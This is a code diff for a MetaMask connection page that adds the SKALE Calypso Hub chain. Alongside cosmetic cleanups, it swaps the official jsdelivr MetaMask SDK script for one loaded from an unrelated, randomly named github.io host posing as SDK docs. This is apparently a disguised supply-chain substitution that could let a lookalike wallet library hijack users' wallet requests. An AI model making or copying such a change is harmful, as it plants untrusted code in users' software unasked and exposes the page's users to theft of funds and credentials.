@@ -29,8 +29,9 @@
   <button onclick="connect()">Connect</button>
   <button onclick="addChain()">Add Skale Chain</button>
 
-  <script src="https://cdn.jsdelivr.net/npm/@metamask/sdk"></script>
+  <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
   <script>
+    // Initialize the MetaMask SDK
     const sdk = new MetaMaskSDK({
       dappMetadata: {
         name: "SKALE CONNECTIVITY",
@@ -49,19 +50,17 @@
     const skaleChainName = 'Calypso Hub'; // Skale chain name
     var accounts;
 
-    //<---------CONNECT WITH METAMASK----------------------->
     async function connect() {
       try {
         provider = sdk.getProvider();
+
         if (!provider) {
           throw new Error('MetaMask provider is not available.');
         }
-        
-        // Request accounts
-        const res = await provider.request({ method: 'eth_requestAccounts' });
-        accounts = res;
 
-        // Update status
+        // Request accounts from MetaMask
+        const accountsResponse = await provider.request({ method: 'eth_requestAccounts' });
+        accounts = accountsResponse;
         updateStatus('Connected');
 
         // Check and switch to Skale chain
@@ -79,7 +78,6 @@
       document.getElementById('status').innerText = `Status: ${text}`;
     }
 
-    // <---------------------Switch to Skale chain------------------>
     async function switchToSkaleChain() {
       try {
         await provider.request({
@@ -88,7 +86,6 @@
         });
         updateStatus('Switched to Skale Chain');
       } catch (switchError) {
-        // This error code indicates that the chain has not been added to MetaMask
         if (switchError.code === 4902) {
             // Add the Skale chain if it's not available in MetaMask
             await addChain();
@@ -99,9 +96,12 @@
       }
     }
 
-    // <-----------------------ADD CHAIN------------------>
     async function addChain() {
       try {
+        if (!provider) {
+          throw new Error('MetaMask provider is not available.');
+        }
+        
         await provider.request({
             method: 'wallet_addEthereumChain',
             params: [
@@ -111,9 +111,9 @@
                 rpcUrls: [skaleRpcUrl],
                 blockExplorerUrls: [skaleBlockExplorerUrls],
                 nativeCurrency: { 
-                  name: 'SKALE', // Name of the currency
-                  symbol: skaleCurrentSymbol, // Symbol of the currency
-                  decimals: 18 // Number of decimals
+                  name: 'SKALE',
+                  symbol: skaleCurrentSymbol,
+                  decimals: 18
                 },
               },
             ],
